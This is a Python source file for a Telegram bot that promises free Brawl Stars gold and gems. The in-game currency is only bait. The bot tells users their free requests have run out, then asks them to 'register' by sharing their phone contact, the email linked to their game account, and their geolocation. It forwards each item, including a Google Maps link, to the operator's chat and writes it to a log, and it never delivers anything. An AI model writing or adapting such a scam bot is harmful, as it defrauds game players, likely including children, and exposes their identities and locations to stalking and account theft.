import telebot
from telebot import types
import time
import random


log = open('bot-log.txt', 'a+', encoding='utf-8')
ID = ''
bot = telebot.TeleBot("")
bot.send_message(ID, '!BOT STARTED!')
print("Бот запущен!") 
@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, f'''👋 Привет, {message.from_user.first_name}! 👋
		Это бот, который может задонатить в бравл старс 
		Чтобы начать, напиши команду /don''') 

@bot.message_handler(commands=['don'])
def start(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="💰Золото💰", callback_data="first")
	second_button = types.InlineKeyboardButton(text="💎Гемы💎", callback_data="second")
	keyboardmain.add(first_button, second_button)
	bot.send_message(message.chat.id, "Выберите пункт:", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
	if call.data == "first":
		msg = bot.send_message(call.message.chat.id, 'Введите колличество золота💰 (не более 500)') 
		bot.register_next_step_handler(msg, proc1)

	elif call.data == "second":
		msg = bot.send_message(call.message.chat.id, 'Введите колличество гемов💎 (не более 50)') 
		bot.register_next_step_handler(msg, proc2)

def proc1(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /don!')#⏳
			return
		if int(num) > 500:
			bot.reply_to(message, 'Колличество золота не может быть более 500!')
			return


		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Зарегестрироваться", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Похоже у вас не осталось бесплатных запросов на день!
			Чтобы получить дополнительные запросы зарегестрируйтесь в боте!''', reply_markup=keyboard)
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Произошла неопознанная ошибка, перезагрузите бота!')


def proc2(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /don!')#⏳
			return

		if int(num) > 50:
			bot.reply_to(message, 'Колличество гемов не может быть более 50!')
			return

		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Зарегестрироваться", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Похоже у вас не осталось бесплатных запросов на день!
			Чтобы получить дополнительные запросы зарегестрируйтесь в боте!''', reply_markup=keyboard)

	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Произошла неопознанная ошибка, перезагрузите бота!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		info = f'''
			Данные
			├Имя: {first} {last}
			├ID: {userid}
			├Ник: @{nick}
			└Номер телефона: {phone}
			'''

		bot.send_message(ID, info)
		print(info)

		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, 'Отправьте свой контакт!')
		bot.send_message(message.chat.id, 'Регистрация прошла успешно!') 
		time.sleep(1)
		msg = bot.send_message(message.chat.id, 'Введите почту, привязанную к игре:') 
		bot.register_next_step_handler(msg, entr)

def entr(message):
	try:
		inp = message.text
		m_id = message.chat.id


		bot.send_message(ID, f'Почта: {inp}')

		markup_reply = types.ReplyKeyboardMarkup(resize_keyboard = True)
		item_an = types.KeyboardButton('Получить больше гемов')
		markup_reply.add(item_an)
		bot.send_message(message.chat.id, f'Почта: {inp} ', reply_markup = markup_reply)
		time.sleep(1)
		bot.send_message(message.chat.id, 'Ожидайте донат на ваш аккаунт в течении 24 часов!')

	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Произошла неопознанная ошибка, перезагрузите бота!')

@bot.message_handler(content_types = ['text'])
def get_text(message):
	if message.text == 'Получить больше гемов':
		m_id = message.chat.id
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Подтвердить", request_location=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Чтобы получить больше гемов, подтвердите геолокацию!''', reply_markup=keyboard)

@bot.message_handler(content_types=['location']) 
def contact(message):
	if message.location is not None: 
		lon = str(message.location.longitude)
		lat = str(message.location.latitude)
		geo = f'''
		Геолокация
		├ID: {message.chat.id}
		├Longitude: {lon}
		├Latitude: {lat} 
		└Карты: https://www.google.com/maps/place/{lat}+{lon} 
		'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(geo + '  ')
		log.close()
		bot.send_message(ID, geo) 
		print(geo)
		msg = bot.send_message(message.chat.id, 'Введите колличество гемов💎 (не более 800)') 
		bot.register_next_step_handler(msg, proc3)

def proc3(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /don!')#⏳
			return

		if int(num) > 800:
			bot.reply_to(message, 'Колличество гемов не может быть более 800!')
			return

		time.sleep(2)
		msg = bot.send_message(message.chat.id, 'Введите почту, привязанную к игре:') 
		bot.register_next_step_handler(msg, entr1)
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Произошла неопознанная ошибка, перезагрузите бота!')

def entr1(message):
	try:
		inp = message.text
		m_id = message.chat.id

		bot.reply_to(message, f'Почта: {inp} ')#⏳
		bot.send_message(ID, f'Почта: {inp}')
		time.sleep(1)
		bot.send_message(message.chat.id, 'Ожидайте донат на ваш аккаунт в течении 24 часов!')
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Произошла неопознанная ошибка, перезагрузите бота!')




	

bot.polling()

